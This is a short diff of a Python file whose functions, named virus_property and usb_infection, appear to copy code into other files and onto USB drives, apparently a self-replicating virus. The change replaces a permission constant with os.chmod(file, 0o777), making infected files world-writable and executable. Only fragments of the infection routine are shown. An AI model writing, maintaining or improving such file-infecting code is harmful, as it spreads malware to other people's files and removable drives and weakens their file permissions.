@@ -2,7 +2,6 @@
 import getpass
 import os
 import subprocess
-import stat
 import time
 
 import sys
@@ -46,7 +45,7 @@ def virus_property():
                                 g.write(lines + '\n' + line)
                                 g.close()
                                 c.close()
-                                os.chmod(file, stat.S_IRWXO)
+                                os.chmod(file, 0o777)
                         else:
                             pass
                 except Exception:
@@ -74,7 +73,7 @@ def usb_infection():
                                     g.write(lines + '\n' + line)
                                     g.close()
                                     c.close()
-                                    os.chmod(file, stat.S_IRWXO)
+                                    os.chmod(file, 0o777)
                             else:
                                 pass
                     except Exception:
